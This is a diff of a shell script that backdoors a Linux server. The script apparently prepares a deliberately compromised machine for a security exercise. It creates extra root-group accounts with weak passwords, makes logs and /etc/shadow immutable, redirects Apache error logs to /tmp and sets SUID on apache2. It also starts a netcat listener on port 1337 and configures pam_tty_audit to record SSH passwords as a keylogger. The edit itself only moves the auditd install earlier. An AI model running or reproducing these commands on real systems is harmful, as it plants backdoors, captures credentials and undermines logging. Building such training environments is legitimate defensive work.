@@ -4,8 +4,11 @@ useradd imposter -g 0 -p admin -r -s /bin/bash
 useradd impasta2 -g 0 -p admin -s /bin/sh
 useradd iaminsideyourwalls -g 1 -p admin -s /bin/csh
 useradd l33th4x0r -g 0 -p hax -s /bin/sh
+#Install auditd before we break stuff
+apt install -y auditd
 #Make /var/log and /etc/passwd readonly :)
 chattr -R +i /var/log
+chattr -i /var/log/audit
 chattr +i /etc/shadow
 #Force webserver to log to tmp and mess with error logging :)
 sed -i 's/ErrorLog \${APACHE_LOG_DIR}\/error\.log/ErrorLog \/tmp\/hahawrongdir.log/' /etc/apache2/apache2.conf
@@ -21,8 +24,6 @@ chmod u+s /usr/sbin/apache2
 nc -lvp 1337 &
 #Install keylogger
 cp -v /etc/pam.d/sshd /tmp/systemdtemporaryfile
-#Install auditd to make sure this works
-apt install -y auditd
 systemctl enable auditd
 echo "session required pam_tty_audit.so disable=* enable=* open_only log_passwd" > /etc/pam.d/sshd
 systemctl restart sshd
